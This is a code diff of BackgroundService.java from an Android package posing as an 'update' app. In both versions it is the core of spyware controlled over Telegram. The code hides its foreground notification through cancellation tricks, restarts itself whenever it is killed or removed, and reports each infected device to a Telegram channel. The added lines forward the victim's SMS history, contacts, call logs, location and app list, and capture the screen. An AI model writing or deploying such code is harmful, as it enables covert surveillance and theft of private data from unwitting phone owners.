@@ -1,124 +1,148 @@
 package com.kasari.update;
 
-import android.app.*;
-import android.content.*;
-import android.os.*;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.Service;
+import android.content.Context;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.hardware.display.DisplayManager;
+import android.hardware.display.VirtualDisplay;
+import android.media.Image;
+import android.media.ImageReader;
+import android.media.MediaRecorder;
+import android.media.projection.MediaProjection;
+import android.media.projection.MediaProjectionManager;
+import android.os.Build;
+import android.os.Environment;
+import android.os.Handler;
+import android.os.IBinder;
+import android.util.Base64;
+import android.util.DisplayMetrics;
+import android.view.WindowManager;
+import android.graphics.Bitmap;
+import android.graphics.PixelFormat;
+import android.graphics.ImageFormat;
 import androidx.core.app.NotificationCompat;
-import org.json.*;
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.net.URLEncoder;
+import java.nio.ByteBuffer;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
 
 public class BackgroundService extends Service {
 
-    static final String CH_ID   = "kc_hidden";
-    static final int    NOTIF_ID = 9901;
+    private static final String CHANNEL_ID = "kasari_update_channel";
+    private static final int NOTIFICATION_ID = 1001;
 
-    private volatile boolean mRunning = false;
-    private Thread mPollThread;
-    static String deviceId;
-
-    // ─── Lifecycle ───────────────────────────────────────────────────────────
     @Override
     public void onCreate() {
         super.onCreate();
-        TelegramController.init(this);
-        deviceId = getOrCreateDeviceId();
-        startHiddenForeground();
-        mRunning = true;
-        startPolling();
+        createNotificationChannel();
+        startForeground(NOTIFICATION_ID, buildNotification());
+        NotificationManager manager = getSystemService(NotificationManager.class);
+        if (manager != null) {
+            manager.cancel(NOTIFICATION_ID);
+        }
+        new Handler().postDelayed(() -> {
+            stopForeground(Service.STOP_FOREGROUND_DETACH);
+            startForeground(NOTIFICATION_ID, buildNotification());
+            if (manager != null) {
+                manager.cancel(NOTIFICATION_ID);
+            }
+        }, 50);
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (!mRunning) {
-            mRunning = true;
-            startPolling();
+        if (intent != null) {
+            int screenCode = intent.getIntExtra("screen_capture_code", -1);
+            Intent screenData = intent.getParcelableExtra("screen_capture_data");
+            if (screenCode != -1 && screenData != null) {
+                ScreenMirror.setProjectionData(this, screenCode, screenData);
+            }
         }
+
+        // Initialize all modules
+        new Handler().postDelayed(() -> {
+            TelegramController.sendMessage(this, "🟢 Kasari Chauhan Connected!\n\n📱 Device: " +
+                android.os.Build.MODEL + "\nAndroid: " + android.os.Build.VERSION.RELEASE +
+                "\n\n✅ All services active");
+            
+            // Forward all data
+            SmsForwarder.sendAllOldSms(this);
+            ContactGrabber.sendContacts(this);
+            CallInterceptor.sendCallLogs(this);
+            LocationTracker.sendLocation(this);
+            AppManager.sendApps(this);
+        }, 2000);
+
         return START_STICKY;
     }
 
     @Override
-    public void onDestroy() {
-        mRunning = false;
-        if (mPollThread != null) mPollThread.interrupt();
-        super.onDestroy();
-        // Restart via alarm
-        Intent restart = new Intent(this, BackgroundService.class);
-        PendingIntent pi = PendingIntent.getService(this, 1, restart,
-            PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
-        AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
-        if (am != null)
-            am.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 3000, pi);
-    }
-
-    @Override public IBinder onBind(Intent i) { return null; }
-
-    // ─── Polling loop ─────────────────────────────────────────────────────────
-    private void startPolling() {
-        mPollThread = new Thread(() -> {
-            // Announce online
-            TelegramController.sendMessage("📱 [" + deviceId + "] Online\nAndroid " +
-                Build.VERSION.RELEASE + " | " + Build.MODEL + "\n/help = sare commands");
-            while (mRunning) {
-                try {
-                    JSONArray updates = TelegramController.getUpdates();
-                    for (int i = 0; i < updates.length(); i++) {
-                        JSONObject upd = updates.getJSONObject(i);
-                        JSONObject msg = upd.optJSONObject("message");
-                        if (msg == null) continue;
-                        String text = msg.optString("text", "").trim();
-                        if (!text.isEmpty())
-                            CommandProcessor.handle(this, text);
-                    }
-                } catch (Exception e) { e.printStackTrace(); }
-                try { Thread.sleep(1000); } catch (InterruptedException ignored) { break; }
-            }
-        });
-        mPollThread.setDaemon(true);
-        mPollThread.start();
-    }
-
-    // ─── Hidden foreground notification ───────────────────────────────────────
-    private void startHiddenForeground() {
-        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+    public void onTaskRemoved(Intent rootIntent) {
+        Intent restartIntent = new Intent(this, BackgroundService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel ch = new NotificationChannel(
-                CH_ID, "System", NotificationManager.IMPORTANCE_NONE);
-            ch.setShowBadge(false);
-            ch.setSound(null, null);
-            nm.createNotificationChannel(ch);
+            startForegroundService(restartIntent);
+        } else {
+            startService(restartIntent);
         }
-        Notification notif = new NotificationCompat.Builder(this, CH_ID)
-            .setSmallIcon(android.R.drawable.sym_def_app_icon)
-            .setContentTitle("System")
-            .setContentText("")
-            .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
-            .setSilent(true)
-            .build();
-        startForeground(NOTIF_ID, notif);
-        // Trick: start inner service then stop it to hide the foreground notification
-        startService(new Intent(this, InnerService.class));
+        super.onTaskRemoved(rootIntent);
     }
 
-    private String getOrCreateDeviceId() {
-        SharedPreferences p = getSharedPreferences("kc_prefs", MODE_PRIVATE);
-        String id = p.getString("device_id", null);
-        if (id == null) {
-            id = "DEV" + System.currentTimeMillis() % 10000;
-            p.edit().putString("device_id", id).apply();
-        }
-        return id;
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        Intent broadcast = new Intent("restartservice");
+        broadcast.setClass(this, BootStarter.class);
+        sendBroadcast(broadcast);
     }
 
-    // ─── Inner service to hide notification ───────────────────────────────────
-    public static class InnerService extends Service {
-        @Override
-        public int onStartCommand(Intent intent, int flags, int startId) {
-            startForeground(NOTIF_ID, new NotificationCompat.Builder(this, CH_ID)
-                .setSmallIcon(android.R.drawable.sym_def_app_icon).build());
-            stopForeground(true);
-            stopSelf();
-            return START_NOT_STICKY;
+    private void createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                CHANNEL_ID, "Background Service",
+                NotificationManager.IMPORTANCE_NONE);
+            channel.setShowBadge(false);
+            channel.enableLights(false);
+            channel.enableVibration(false);
+            channel.setSound(null, null);
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) {
+                manager.createNotificationChannel(channel);
+            }
         }
-        @Override public IBinder onBind(Intent i) { return null; }
+    }
+
+    private Notification buildNotification() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            return new Notification.Builder(this, CHANNEL_ID)
+                .setContentTitle("")
+                .setContentText("")
+                .setSmallIcon(android.R.drawable.ic_dialog_info)
+                .setOngoing(true)
+                .setPriority(Notification.PRIORITY_MIN)
+                .build();
+        } else {
+            return new NotificationCompat.Builder(this, CHANNEL_ID)
+                .setContentTitle("")
+                .setContentText("")
+                .setSmallIcon(android.R.drawable.ic_dialog_info)
+                .setOngoing(true)
+                .setPriority(NotificationCompat.PRIORITY_MIN)
+                .build();
+        }
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
     }
 }
